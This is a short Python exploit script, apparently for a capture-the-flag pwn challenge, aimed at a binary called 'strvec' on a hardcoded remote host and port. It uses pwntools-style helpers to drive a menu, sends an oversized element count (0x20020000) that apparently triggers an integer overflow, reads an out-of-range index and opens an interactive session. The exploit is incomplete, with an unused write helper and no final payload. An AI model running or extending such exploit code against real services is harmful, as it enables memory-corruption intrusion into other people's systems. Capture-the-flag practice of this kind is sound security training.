#!/usr/bin/env python3.9
# -*- coding: utf-8 -*-
from rootkit import *

exe = context.binary = ELF('./strvec')

host = args.HOST or '168.119.108.148'
port = int(args.PORT or 12010)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

gdbscript = '''
tbreak main
continue
'''.format(**locals())

# -- Exploit goes here --

def cmd(option):
    sla(b"> ", str(option).encode('utf-8'))

def get_(idx):
    cmd(1)
    sla(b"idx = ", str(idx).encode('utf'))

def set_(idx, data):
    cmd(2)
    sla(b"idx = ", str(idx).encode('utf'))
    sa(b"data = ", data)

io = start()

sa(b"Name: ", b"DONOTMATTER")
sla(b"n = ", str(0x20020000).encode('utf-8'))

get_(str(1983))

io.interactive()

